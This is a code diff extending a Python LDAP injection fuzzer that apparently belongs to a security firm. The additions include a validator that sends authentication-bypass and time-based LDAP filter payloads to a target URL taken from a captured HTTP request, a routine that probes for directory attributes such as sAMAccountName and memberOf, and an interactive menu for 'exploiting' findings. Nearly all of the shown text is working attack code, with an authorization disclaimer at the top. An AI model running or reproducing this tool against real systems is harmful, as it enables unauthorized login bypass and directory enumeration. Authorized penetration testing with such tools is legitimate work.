@@ -20,6 +20,28 @@
 #          intelligent fuzzing, response analysis, and anomaly detection across
 #          multiple attack vectors including authentication bypass, blind injection,
 #          and error-based exploitation techniques.
+#
+# AUTHORIZATION REQUIRED: This tool is intended ONLY for authorized security testing
+#                         and research purposes. Users MUST obtain explicit written
+#                         permission before testing any systems. Unauthorized access
+#                         to computer systems is illegal under applicable laws including
+#                         the Computer Fraud and Abuse Act (CFAA) and similar statutes.
+#
+# DISCLAIMER: This software is provided "as-is," without warranty of any kind,
+#             express or implied, including but not limited to the warranties
+#             of merchantability, fitness for a particular purpose, and non-infringement.
+#             In no event shall the authors or copyright holders be liable for any claim,
+#             damages, or other liability, whether in an action of contract, tort, or otherwise,
+#             arising from, out of, or in connection with the software or the use or other
+#             dealings in the software. The authors assume no responsibility for misuse
+#             or unauthorized use of this tool.
+#
+# USE RESPONSIBLY: Security testing tools can cause disruption to production systems.
+#                  Always test in controlled environments and follow responsible
+#                  disclosure practices. Respect scope limitations and rules of
+#                  engagement defined in your security assessment authorization.
+#
+# =============================================================================
 
 import requests
 import urllib.parse
@@ -36,7 +58,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 
 class LDAPPayloadLibrary:
-    """LDAP injection payload collection"""
+    """Comprehensive LDAP injection payload collection"""
 
     @staticmethod
     def get_all_payloads() -> Dict[str, List[str]]:
@@ -108,6 +130,7 @@ class LDAPPayloadLibrary:
             all_payloads.extend(payloads)
         return all_payloads
 
+
 class HTTPRequestParser:
     """Parse raw HTTP requests from files"""
 
@@ -161,30 +184,28 @@ class HTTPRequestParser:
                 headers[key] = value
 
         # Construct full URL - handle proxy-style vs normal requests
-        # Check if path is already a full URL (proxy-style request)
         if path.startswith('http://') or path.startswith('https://'):
             # It's a full URL - use it directly, just clean it up
             url = path.split(';')[0].split('?')[0]
         else:
             # Normal relative path - construct URL from host header
-            scheme = "https"  # Default to HTTPS
+            scheme = "https"
             clean_path = path.split(';')[0].split('?')[0]
             url = f"{scheme}://{host}{clean_path}"
 
         # Parse POST parameters from body
         params = {}
         if body:
-            # URL decode the body
             body = body.strip()
             for param in body.split('&'):
                 if '=' in param:
                     key, value = param.split('=', 1)
-                    # URL decode
                     key = urllib.parse.unquote(key)
                     value = urllib.parse.unquote(value)
                     params[key] = value
 
         return url, headers, cookies, params, method
+
 
 class ResponseAnalyzer:
     """Analyze responses to detect successful injections"""
@@ -205,7 +226,8 @@ class ResponseAnalyzer:
             'status_code': response.status_code,
             'length': len(response.text),
             'time': response_time,
-            'anomalies': []
+            'anomalies': [],
+            'response_text': response.text
         }
 
         # Set baseline from first response
@@ -244,13 +266,280 @@ class ResponseAnalyzer:
                 findings['anomalies'].append(f"Error pattern detected: {pattern}")
                 break
 
-        # Time-based detection (if significantly slower)
+        # Time-based detection
         if len(self.response_times) > 5:
             avg_time = statistics.mean(self.response_times[:-1])
             if response_time > (avg_time * 2):
                 findings['anomalies'].append(f"Timing anomaly: {response_time:.2f}s (avg: {avg_time:.2f}s)")
 
         return findings
+
+
+class LDAPValidator:
+    """Validate and exploit LDAP injection findings"""
+    
+    def __init__(self, url: str, headers: Dict, cookies: Dict, params: Dict):
+        self.url = url
+        self.headers = headers
+        self.cookies = cookies
+        self.base_params = params
+        
+    def test_payload(self, param_name: str, payload: str, timeout: int = 30) -> Dict:
+        """Test a single payload and return detailed results"""
+        test_params = self.base_params.copy()
+        test_params[param_name] = payload
+        
+        start = time.time()
+        try:
+            response = requests.post(
+                self.url,
+                headers=self.headers,
+                cookies=self.cookies,
+                data=test_params,
+                verify=False,
+                timeout=timeout
+            )
+            elapsed = time.time() - start
+            
+            return {
+                'payload': payload,
+                'status': response.status_code,
+                'length': len(response.text),
+                'time': elapsed,
+                'response': response.text,
+                'error': None
+            }
+        except requests.exceptions.Timeout:
+            return {
+                'payload': payload,
+                'status': 0,
+                'length': 0,
+                'time': timeout,
+                'response': '',
+                'error': 'TIMEOUT'
+            }
+        except Exception as e:
+            return {
+                'payload': payload,
+                'status': 0,
+                'length': 0,
+                'time': 0,
+                'response': '',
+                'error': str(e)
+            }
+    
+    def confirm_injection(self, param_name: str):
+        """Confirm LDAP injection with comparison tests"""
+        print(f"\n{'='*80}")
+        print(f"[*] LDAP INJECTION VALIDATION TEST")
+        print(f"[*] Target Parameter: {param_name}")
+        print(f"{'='*80}\n")
+        
+        # Test payloads with different characteristics
+        test_cases = {
+            "Baseline (normal)": "test",
+            "Wildcard (match all)": "*",
+            "True condition": "*)(objectClass=*",
+            "False condition": "*)(objectClass=impossibleClass123",
+            "OR bypass": "*)|(uid=*",
+            "AND bypass": "*)(&(objectClass=*",
+            "Time-based (5x)": "*)(&(objectClass=*" * 5,
+            "Time-based (25x)": "*)(&(objectClass=*" * 25,
+            "Time-based (50x)": "*)(&(objectClass=*" * 50,
+        }
+        
+        results = []
+        
+        for label, payload in test_cases.items():
+            print(f"[*] Testing: {label:<25s}", end=" ", flush=True)
+            result = self.test_payload(param_name, payload)
+            results.append({**result, 'label': label})
+            
+            if result['error']:
+                print(f"| ERROR: {result['error']}")
+            else:
+                print(f"| Status: {result['status']} | Length: {result['length']:6d} | Time: {result['time']:6.3f}s")
+            
+            time.sleep(0.5)
+        
+        # Analysis
+        self._analyze_results(results, param_name)
+        
+        return results
+    
+    def _analyze_results(self, results: List[Dict], param_name: str):
+        """Analyze validation test results"""
+        print(f"\n{'='*80}")
+        print(f"[*] VULNERABILITY ANALYSIS")
+        print(f"{'='*80}\n")
+        
+        valid_results = [r for r in results if not r['error']]
+        
+        if len(valid_results) < 2:
+            print("[!] Not enough valid results for analysis")
+            return
+        
+        baseline = valid_results[0]
+        lengths = [r['length'] for r in valid_results]
+        times = [r['time'] for r in valid_results]
+        
+        print(f"[+] Baseline Response:")
+        print(f"    Length: {baseline['length']} bytes")
+        print(f"    Time: {baseline['time']:.3f}s")
+        print(f"\n[+] Response Statistics:")
+        print(f"    Length Range: {min(lengths)} - {max(lengths)} bytes (Δ {max(lengths) - min(lengths)})")
+        print(f"    Time Range: {min(times):.3f}s - {max(times):.3f}s")
+        
+        # Identify anomalies
+        anomalies = []
+        time_based_results = [r for r in valid_results if 'Time-based' in r['label']]
+        
+        print(f"\n[!] ANOMALY DETECTION:\n")
+        
+        for result in valid_results[1:]:
+            indicators = []
+            
+            length_diff = abs(result['length'] - baseline['length'])
+            length_pct = (length_diff / baseline['length'] * 100) if baseline['length'] > 0 else 0
+            
+            if length_pct > 5:
+                indicators.append(f"Length Δ: {length_diff} bytes ({length_pct:.1f}%)")
+            
+            time_diff = result['time'] - baseline['time']
+            if time_diff > 1.0 or result['time'] > baseline['time'] * 1.5:
+                indicators.append(f"Timing Δ: +{time_diff:.3f}s ({result['time']/baseline['time']*100:.0f}% of baseline)")
+            
+            if indicators:
+                anomalies.append(result)
+                print(f"  ⚠️  [{result['label']}]")
+                for ind in indicators:
+                    print(f"      → {ind}")
+                print()
+        
+        # Progressive timing check
+        if len(time_based_results) >= 3:
+            times = [r['time'] for r in time_based_results]
+            if times == sorted(times):
+                print(f"  🔴 CRITICAL: Progressive timing correlation detected!")
+                print(f"      → 5x:  {time_based_results[0]['time']:.3f}s")
+                print(f"      → 25x: {time_based_results[1]['time']:.3f}s")
+                print(f"      → 50x: {time_based_results[2]['time']:.3f}s")
+                print(f"      → Strong indicator of time-based LDAP injection\n")
+        
+        # Verdict
+        self._render_verdict(anomalies, time_based_results)
+        
+        # Save detailed results
+        self._save_validation_results(results, param_name)
+    
+    def _render_verdict(self, anomalies: List, time_based_results: List):
+        """Render vulnerability verdict"""
+        print(f"\n{'='*80}")
+        print(f"[*] VERDICT")
+        print(f"{'='*80}\n")
+        
+        confidence_score = 0
+        
+        if len(anomalies) >= 3:
+            confidence_score += 30
+        elif len(anomalies) >= 1:
+            confidence_score += 15
+        
+        if len(time_based_results) >= 3:
+            times = [r['time'] for r in time_based_results]
+            if times == sorted(times):
+                confidence_score += 50
+        
+        if any('Length Δ' in str(a.get('indicators', [])) for a in anomalies):
+            confidence_score += 20
+        
+        if confidence_score >= 70:
+            print("    🔴 HIGH CONFIDENCE - LDAP Injection Vulnerability Confirmed")
+            print("    ├─ Backend is processing and executing LDAP filters")
+            print("    ├─ Application vulnerable to authentication bypass")
+            print("    └─ Recommend immediate remediation")
+        elif confidence_score >= 40:
+            print("    🟡 MEDIUM CONFIDENCE - Likely LDAP Injection Vulnerability")
+            print("    ├─ Strong indicators of filter processing")
+            print("    └─ Further manual testing recommended")
+        elif confidence_score >= 20:
+            print("    🟠 LOW CONFIDENCE - Possible LDAP Injection")
+            print("    └─ Weak indicators detected, requires deeper investigation")
+        else:
+            print("    🟢 NO VULNERABILITY DETECTED")
+            print("    └─ Application appears to properly sanitize LDAP input")
+        
+        print()
+    
+    def _save_validation_results(self, results: List[Dict], param_name: str):
+        """Save detailed validation results"""
+        filename = f"ldap_validation_{param_name.replace(':', '_')}_{int(time.time())}.txt"
+        
+        with open(filename, 'w') as f:
+            f.write("="*80 + "\n")
+            f.write("LDAP INJECTION VALIDATION REPORT\n")
+            f.write("="*80 + "\n\n")
+            f.write(f"Parameter: {param_name}\n")
+            f.write(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
+            
+            for result in results:
+                f.write(f"\n{'='*80}\n")
+                f.write(f"Test: {result['label']}\n")
+                f.write(f"Payload: {result['payload'][:200]}\n")
+                f.write(f"Status: {result['status']}\n")
+                f.write(f"Length: {result['length']}\n")
+                f.write(f"Time: {result['time']:.3f}s\n")
+                if result['error']:
+                    f.write(f"Error: {result['error']}\n")
+                f.write(f"{'='*80}\n\n")
+                if result['response']:
+                    f.write("RESPONSE BODY:\n")
+                    f.write(result['response'][:5000])  # Limit to first 5000 chars
+                    f.write("\n\n")
+        
+        print(f"[+] Detailed validation report saved: {filename}")
+    
+    def enumerate_attributes(self, param_name: str):
+        """Try to enumerate LDAP attributes"""
+        print(f"\n{'='*80}")
+        print(f"[*] LDAP ATTRIBUTE ENUMERATION")
+        print(f"[*] Testing common LDAP attributes for differential responses")
+        print(f"{'='*80}\n")
+        
+        attributes = [
+            'cn', 'uid', 'mail', 'sn', 'givenName', 'displayName',
+            'sAMAccountName', 'userPrincipalName', 'objectClass',
+            'memberOf', 'description', 'telephoneNumber', 'department',
+            'title', 'o', 'ou', 'dc', 'distinguishedName'
+        ]
+        
+        baseline = self.test_payload(param_name, "test")
+        print(f"[+] Baseline length: {baseline['length']} bytes\n")
+        
+        interesting = []
+        
+        for attr in attributes:
+            payload = f"*)({attr}=*"
+            result = self.test_payload(param_name, payload)
+            
+            diff = abs(result['length'] - baseline['length'])
+            pct = (diff / baseline['length'] * 100) if baseline['length'] > 0 else 0
+            
+            indicator = "⚠️ " if pct > 5 else "   "
+            print(f"{indicator}{attr:25s} | Length: {result['length']:6d} | Diff: {diff:5d} ({pct:5.1f}%)")
+            
+            if pct > 5:
+                interesting.append((attr, diff, pct))
+            
+            time.sleep(0.3)
+        
+        if interesting:
+            print(f"\n[!] INTERESTING ATTRIBUTES (significant response differences):\n")
+            for attr, diff, pct in interesting:
+                print(f"    • {attr}: {diff} bytes difference ({pct:.1f}%)")
+                print(f"      → This attribute likely exists in the LDAP schema")
+        else:
+            print(f"\n[-] No significant differences detected in attribute enumeration")
 
 
 class LDAPFuzzer:
@@ -263,6 +552,7 @@ class LDAPFuzzer:
         self.base_params = params
         self.method = method
         self.analyzer = ResponseAnalyzer()
+        self.all_findings = []  # Store findings across parameters
 
     def get_fuzzable_params(self) -> List[str]:
         """Return list of parameters that can be fuzzed"""
@@ -306,18 +596,22 @@ class LDAPFuzzer:
                 # Show anomalies
                 if analysis['anomalies']:
                     print(f"         └─> INTERESTING: {', '.join(analysis['anomalies'])}")
+                    analysis['parameter'] = param_name
                     interesting_findings.append(analysis)
 
                 elif verbose:
-                    # Show response snippet in verbose mode
                     snippet = response.text[:100].replace('\n', ' ')
                     print(f"         └─> Response: {snippet}...")
 
             except requests.exceptions.Timeout:
                 print(f"[{i:3d}/{len(payloads)}] ⏱ | TIMEOUT after 10s | Payload: {payload[:60]}")
                 interesting_findings.append({
+                    'parameter': param_name,
                     'payload': payload,
-                    'anomalies': ['Request timeout - possible time-based injection']
+                    'anomalies': ['Request timeout - possible time-based injection'],
+                    'status_code': 0,
+                    'length': 0,
+                    'time': 10.0
                 })
             except Exception as e:
                 print(f"[{i:3d}/{len(payloads)}] ✗ | ERROR: {str(e)[:50]} | Payload: {payload[:60]}")
@@ -332,10 +626,15 @@ class LDAPFuzzer:
         if interesting_findings:
             print(f"\n[!] SUMMARY OF INTERESTING PAYLOADS:")
             for finding in interesting_findings:
-                print(f"    Payload: {finding['payload']}")
+                print(f"    Payload: {finding['payload'][:80]}")
                 print(f"    Anomalies: {', '.join(finding['anomalies'])}")
                 print()
         print(f"{'='*80}\n")
+        
+        # Store findings for post-fuzzing validation
+        self.all_findings.extend(interesting_findings)
+        
+        return interesting_findings
 
 
 def select_parameters(available_params: List[str]) -> List[str]:
@@ -354,22 +653,18 @@ def select_parameters(available_params: List[str]) -> List[str]:
             if choice == '0':
                 return []
 
-            # Handle "all" option
             if str(len(available_params) + 1) in choice:
                 return available_params
 
-            # Parse selection
             selected = []
             for part in choice.split(','):
                 part = part.strip()
                 if '-' in part:
-                    # Range selection
                     start, end = map(int, part.split('-'))
                     selected.extend(range(start, end + 1))
                 else:
                     selected.append(int(part))
 
-            # Convert to parameter names
             result = [available_params[i-1] for i in selected if 1 <= i <= len(available_params)]
             return result
 
@@ -377,9 +672,85 @@ def select_parameters(available_params: List[str]) -> List[str]:
             print("[!] Invalid selection. Try again.")
 
 
+def post_fuzzing_menu(fuzzer: LDAPFuzzer, findings: List[Dict]):
+    """Interactive menu for validating and exploiting findings"""
+    if not findings:
+        print("\n[*] No interesting findings to validate.")
+        return
+    
+    # Group findings by parameter
+    param_findings = defaultdict(list)
+    for finding in findings:
+        param_findings[finding['parameter']].append(finding)
+    
+    while True:
+        print(f"\n{'='*80}")
+        print(f"[*] POST-FUZZING VALIDATION MENU")
+        print(f"[*] Found {len(findings)} potential injection points across {len(param_findings)} parameters")
+        print(f"{'='*80}\n")
+        
+        print("[*] Available Actions:\n")
+        
+        idx = 1
+        param_menu = {}
+        for param, param_finds in param_findings.items():
+            print(f"    {idx}. Validate '{param}' ({len(param_finds)} findings)")
+            param_menu[idx] = param
+            idx += 1
+        
+        print(f"\n    {idx}. Enumerate LDAP Attributes (choose parameter)")
+        enum_option = idx
+        idx += 1
+        
+        print(f"    {idx}. Run Full Validation on All Parameters")
+        all_option = idx
+        idx += 1
+        
+        print(f"    0. Exit to Main Menu\n")
+        
+        try:
+            choice = input("[?] Select action: ").strip()
+            
+            if choice == '0':
+                break
+            
+            choice_int = int(choice)
+            
+            if choice_int in param_menu:
+                # Validate specific parameter
+                param = param_menu[choice_int]
+                validator = LDAPValidator(fuzzer.url, fuzzer.headers, fuzzer.cookies, fuzzer.base_params)
+                validator.confirm_injection(param)
+                input("\n[?] Press ENTER to continue...")
+                
+            elif choice_int == enum_option:
+                # Choose parameter for enumeration
+                print("\n[*] Select parameter for attribute enumeration:")
+                for i, param in enumerate(param_menu.values(), 1):
+                    print(f"    {i}. {param}")
+                
+                param_choice = int(input("\n[?] Select parameter: ").strip())
+                if 1 <= param_choice <= len(param_menu):
+                    param = list(param_menu.values())[param_choice - 1]
+                    validator = LDAPValidator(fuzzer.url, fuzzer.headers, fuzzer.cookies, fuzzer.base_params)
+                    validator.enumerate_attributes(param)
+                    input("\n[?] Press ENTER to continue...")
+                
+            elif choice_int == all_option:
+                # Run validation on all parameters
+                for param in param_menu.values():
+                    validator = LDAPValidator(fuzzer.url, fuzzer.headers, fuzzer.cookies, fuzzer.base_params)
+                    validator.confirm_injection(param)
+                    time.sleep(1)
+                input("\n[?] Press ENTER to continue...")
+            
+        except (ValueError, KeyError):
+            print("[!] Invalid selection. Try again.")
+
+
 def main():
     parser = argparse.ArgumentParser(
-        description='Advanced LDAP Injection Fuzzer',
+        description='Advanced LDAP Injection Fuzzer with Validation',
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Examples:
@@ -391,6 +762,9 @@ Examples:
 
   # Use custom payload file
   python ldap_fuzzer.py -f request.txt --payloads custom_payloads.txt
+  
+  # Skip interactive validation menu
+  python ldap_fuzzer.py -f request.txt --no-validate
         """
     )
 
@@ -399,6 +773,7 @@ Examples:
     parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output (show response snippets)')
     parser.add_argument('--payloads', help='File containing custom payloads (one per line)')
     parser.add_argument('--delay', type=float, default=0.1, help='Delay between requests (seconds)')
+    parser.add_argument('--no-validate', action='store_true', help='Skip post-fuzzing validation menu')
 
     args = parser.parse_args()
 
@@ -406,6 +781,8 @@ Examples:
     print("""
 ╔══════════════════════════════════════════════════════════════════════════╗
 ║                         LDAP Injection Fuzzer                            ║
+║                     Advanced Security Testing Tool                       ║
+║                         Red Cell Security, LLC                           ║
 ╚══════════════════════════════════════════════════════════════════════════╝
     """)
 
@@ -456,11 +833,17 @@ Examples:
 
     for param in params_to_fuzz:
         fuzzer.fuzz_parameter(param, payloads, verbose=args.verbose)
-
-        # Reset analyzer for next parameter
-        fuzzer.analyzer = ResponseAnalyzer()
+        fuzzer.analyzer = ResponseAnalyzer()  # Reset for next parameter
 
     print("\n[*] Fuzzing campaign complete!")
+    
+    # Post-fuzzing validation menu
+    if not args.no_validate and fuzzer.all_findings:
+        post_fuzzing_menu(fuzzer, fuzzer.all_findings)
+    elif not fuzzer.all_findings:
+        print("\n[*] No potential vulnerabilities detected during fuzzing.")
+    
+    print("\n[+] LDAP Injection testing complete. Happy hacking! 🔒")
 
 
 if __name__ == "__main__":
